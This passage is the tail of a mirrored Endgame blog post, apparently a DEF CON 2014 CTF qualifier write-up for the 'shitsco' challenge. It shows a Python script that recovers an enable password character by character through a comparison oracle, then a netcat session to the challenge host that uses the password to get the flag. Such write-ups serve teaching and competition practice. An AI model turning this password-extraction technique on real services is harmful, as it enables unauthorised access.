+<span class='n'>chars</span><span class='o'>.</span><span class='na'>sort</span><span class='o'>()</span>
+
+<span class='n'>known</span> <span class='o'>=</span> <span class='s'>&quot;&quot;</span>
+<span class='k'>while</span> <span class='mi'>1</span><span class='o'>:</span>
+<span class='n'>prev</span> <span class='o'>=</span> <span class='n'>chars</span><span class='o'>[</span><span class='mi'>0</span><span class='o'>]</span>
+<span class='k'>for</span> <span class='n'>x</span> <span class='n'>in</span> <span class='nl'>chars:</span>
+
+<span class='n'>i</span> <span class='o'>=</span> <span class='n'>try_pass</span><span class='o'>(</span><span class='n'>known</span> <span class='o'>+</span> <span class='n'>x</span> <span class='o'>+</span> <span class='s'>&quot; &quot;</span> <span class='o'>*</span> <span class='o'>(</span><span class='mi'>30</span><span class='o'>-</span><span class='n'>len</span><span class='o'>(</span><span class='n'>known</span><span class='o'>)))</span>
+<span class='k'>if</span> <span class='nf'>ord</span><span class='o'>(</span><span class='n'>i</span><span class='o'>)</span> <span class='o'>==</span> <span class='mh'>0xff</span><span class='o'>:</span>
+<span class='n'>known</span> <span class='o'>+=</span> <span class='n'>prev</span>
+<span class='k'>break</span>
+<span class='n'>prev</span> <span class='o'>=</span> <span class='n'>x</span>
+
+<span class='n'>i</span> <span class='o'>=</span> <span class='n'>try_pass</span><span class='o'>(</span><span class='n'>known</span><span class='o'>[:-</span><span class='mi'>1</span><span class='o'>]+</span><span class='n'>x</span><span class='o'>+</span><span class='s'>&quot;\x00&quot;</span><span class='o'>)</span>
+<span class='k'>if</span> <span class='n'>i</span> <span class='o'>==</span> <span class='sc'>&#39;!&#39;</span><span class='o'>:</span>
+<span class='n'>print</span> <span class='s'>&quot;Enable password is: %s&quot;</span> <span class='o'>%</span> <span class='o'>(</span><span class='n'>known</span><span class='o'>[:-</span><span class='mi'>1</span><span class='o'>]+</span><span class='n'>x</span><span class='o'>)</span>
+<span class='n'>sys</span><span class='o'>.</span><span class='na'>exit</span><span class='o'>()</span>
+</code></pre></div>
+<p>Running the script produces the output:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>python</span> <span class='n'>shitsco</span><span class='o'>.</span><span class='na'>py</span>
+<span class='n'>Enable</span> <span class='n'>password</span> <span class='nl'>is:</span> <span class='n'>bruT3m3hard3rb4by</span>
+</code></pre></div>
+<p>Excellent, let’s connect to the service with netcat and retrieve the flag:</p>
+<div class='highlight'><pre><code class='java'><span class='n'>$</span> <span class='n'>nc</span> <span class='n'>shitsco_c8b1aa31679e945ee64bde1bdb19d035</span><span class='o'>.</span><span class='mi'>2014</span><span class='o'>.</span><span class='na'>shallweplayaga</span><span class='o'>.</span><span class='na'>me</span> <span class='mi'>31337</span>
+
+ <span class='n'>oooooooo8</span> <span class='n'>oooo</span>        <span class='n'>o88</span>    <span class='n'>o8</span>
+<span class='mi'>888</span>         <span class='mi'>888</span><span class='n'>ooooo</span>   <span class='n'>oooo</span> <span class='n'>o888oo</span>  <span class='n'>oooooooo8</span>    <span class='n'>ooooooo</span>     <span class='n'>ooooooo</span>
+ <span class='mi'>888</span><span class='n'>oooooo</span>  <span class='mi'>888</span>   <span class='mi'>888</span>   <span class='mi'>888</span>  <span class='mi'>888</span>   <span class='mi'>888</span><span class='n'>ooooooo</span>  <span class='mi'>888</span>     <span class='mi'>888</span> <span class='mi'>888</span>     <span class='mi'>888</span>
+       <span class='mi'>888</span> <span class='mi'>888</span>   <span class='mi'>888</span>   <span class='mi'>888</span>  <span class='mi'>888</span>           <span class='mi'>888</span> <span class='mi'>888</span>         <span class='mi'>888</span>     <span class='mi'>888</span>
+<span class='n'>o88oooo888</span> <span class='n'>o888o</span> <span class='n'>o888o</span> <span class='n'>o888o</span>  <span class='mi'>888</span><span class='n'>o</span> <span class='mi'>88</span><span class='n'>oooooo88</span>    <span class='mi'>88</span><span class='n'>ooo888</span>    <span class='mi'>88</span><span class='n'>ooo88</span>
+
+<span class='n'>Welcome</span> <span class='n'>to</span> <span class='n'>Shitsco</span> <span class='n'>Internet</span> <span class='n'>Operating</span> <span class='nf'>System</span> <span class='o'>(</span><span class='n'>IOS</span><span class='o'>)</span>
+<span class='n'>For</span> <span class='n'>a</span> <span class='n'>command</span> <span class='n'>list</span><span class='o'>,</span> <span class='n'>enter</span> <span class='o'>?</span>
+<span class='n'>$</span> <span class='n'>enable</span> <span class='n'>bruT3m3hard3rb4by</span>
+<span class='n'>Authentication</span> <span class='n'>Successful</span>
+<span class='err'>#</span> <span class='n'>flag</span>
+<span class='n'>The</span> <span class='n'>flag</span> <span class='nl'>is:</span> <span class='mi'>14424</span><span class='n'>ff8673ad039b32cfd756989be12</span>
+</code></pre></div>
+<p>All that’s left to do is submit the flag and score points!</p>
+
+<p>I’ll be posting another challenge and solution from the CTF soon, so if you found this one interesting, be sure to check back for more.</p>
+
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+        <div class="addthis_native_toolbox"></div>
+
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+		<script type="text/javascript" src="http://s7.addthis.com/js/300/addthis_widget.js#pubid=ra-53c7dc1328ec3211"></script>
+
+    </div>
+
+    <footer class='site__footer cf'>
+      <div class='wrapper'>
+      <div class='f-left'>
+	<small>&copy; Endgame 2014. All Rights Reserved | Subscribe to our <a href="../feed.xml" target="_blank">RSS</a> feed</small>
+      </div>
+      <div class='f-right'>
+	<a class='logo' href="../index.html">
+	  <img alt="Endgame logo" src="../images/logo.svg">
+	</a>
+      </div>
+    </div><!--//wrapper-->
+    </footer>
+    
+    <a href='#top' class='js-top top'></a>
+    <script src="../javascripts/jquery.js"></script>
+    <script src="../javascripts/waypoints.min.js"></script>
+    
+    
+    <script src="../javascripts/jquery.cycle2.min.js"></script>
+    <script src="../javascripts/app.js"></script>
+    
+</body>
+
+<!-- Mirrored from www.endgame.com/blog/defcon-capture-the-flag-qualification-challenge-1.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 18 Nov 2014 14:55:11 GMT -->
+</html>
